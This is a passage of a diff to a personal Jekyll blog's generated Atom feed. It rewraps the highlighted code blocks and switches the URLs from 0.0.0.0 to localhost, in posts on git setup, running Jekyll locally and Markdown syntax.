+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.email &lt;span class=&quot;s2&quot;&gt;&quot;you@example.com&quot;&lt;/span&gt;
+ 	  git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.name &lt;span class=&quot;s2&quot;&gt;&quot;Your Name&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;If you want to test it locally, you need to make a Gemfile according to the instructions &lt;a href=&quot;https://help.github.com/articles/using-jekyll-as-a-static-site-generator-with-github-pages/&quot;&gt;here&lt;/a&gt;. Then, from the root of your repo:&lt;/p&gt;
 
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle install
-bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve --host&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle install
+bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;p&gt;Using that host=0.0.0.0 means you can do this from a VM and still have it accessible from your host OS, assuming NATing or bridging or whatever you’re doing is in order.&lt;/p&gt;
 
-&lt;p&gt;That’s really all I got so far. Build something very basic that works, back it up, know how to rebuild it quickly, and you’ll handle half the trouble you will inevitably run into very quickly.&lt;/p&gt;</content><summary type="html">Why are we here anyway?</summary></entry><entry><title type="html">What is Markdown anyway?</title><link href="http://0.0.0.0:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html" rel="alternate" type="text/html" title="What is Markdown anyway?" /><published>2016-12-18T21:14:55-06:00</published><updated>2016-12-18T21:14:55-06:00</updated><id>http://0.0.0.0:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown</id><content type="html" xml:base="http://0.0.0.0:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html">&lt;p&gt;I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.&lt;/p&gt;
+&lt;p&gt;That’s really all I got so far. Build something very basic that works, back it up, know how to rebuild it quickly, and you’ll handle half the trouble you will inevitably run into very quickly.&lt;/p&gt;</content><author><name></name></author><summary type="html">Why are we here anyway?</summary></entry><entry><title type="html">What is Markdown anyway?</title><link href="http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html" rel="alternate" type="text/html" title="What is Markdown anyway?" /><published>2016-12-18T21:14:55-06:00</published><updated>2016-12-18T21:14:55-06:00</updated><id>http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown</id><content type="html" xml:base="http://localhost:4000/quick-reference/into/whatamidoing/2016/12/18/what-is-markdown.html">&lt;p&gt;I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://kramdown.gettalong.org/quickref.html&quot;&gt;This page&lt;/a&gt; seems pretty interesting, it has a lot of the syntax I’ll be using.&lt;/p&gt;
 
 &lt;p&gt;This is the format for my post titles. Markup will usually be md for markdown, but maybe I’ll get fancy one day.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;``` YEAR-MONTH-DAY-title.md ```
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;``` YEAR-MONTH-DAY-title.md ```
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;To create a link, use &lt;code class=&quot;highlighter-rouge&quot;&gt;\[Text\]\(http\(s\)://site\.com\)&lt;/code&gt;&lt;/p&gt;
 
@@ -756,7 +872,7 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve --host&lt
 
 &lt;p&gt;Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for&lt;/p&gt;
 
-&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syntax highlighted code block
+&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syntax highlighted code block
 
 &lt;span class=&quot;gh&quot;&gt;# Header 1&lt;/span&gt;
 &lt;span class=&quot;gu&quot;&gt;## Header 2&lt;/span&gt;
@@ -771,8 +887,7 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve --host&lt
 &lt;span class=&quot;gs&quot;&gt;**Bold**&lt;/span&gt; and _Italic_ and &lt;span class=&quot;sb&quot;&gt;`Code`&lt;/span&gt; text
 
 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; and !&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;For more details see &lt;a href=&quot;https://guides.github.com/features/mastering-markdown/&quot;&gt;GitHub Flavored Markdown&lt;/a&gt;.&lt;/p&gt;
 
@@ -786,9 +901,8 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve --host&lt
   &lt;li&gt;List&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Nice and clean:&lt;/strong&gt;&lt;/p&gt;
 
@@ -796,8 +910,7 @@ bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll serve --host&lt
   &lt;li&gt;
     &lt;p&gt;List&lt;/p&gt;
 
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
-&lt;/ul&gt;</content><summary type="html">I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.</summary></entry><entry><title type="html">Welcome to My Scratchpad</title><link href="http://0.0.0.0:4000/welcome/hello/info/2016/12/18/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to My Scratchpad" /><published>2016-12-18T20:49:55-06:00</published><updated>2016-12-18T20:49:55-06:00</updated><id>http://0.0.0.0:4000/welcome/hello/info/2016/12/18/welcome-to-jekyll</id><content type="html" xml:base="http://0.0.0.0:4000/welcome/hello/info/2016/12/18/welcome-to-jekyll.html">&lt;p&gt;Thanks for visiting my page. Hopefully you’re here because you’ve run into some of the same problems I’ve run into and are looking for an answer. Maybe I can be that answer. Maybe.&lt;/p&gt;</content><summary type="html">Thanks for visiting my page. Hopefully you’re here because you’ve run into some of the same problems I’ve run into and are looking for an answer. Maybe I can be that answer. Maybe.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">I don’t know markdown syntax but it seems easy enough. This page is intended to be a quick reference for the 5-10 things I will no doubt do over and over and over.</summary></entry></feed>
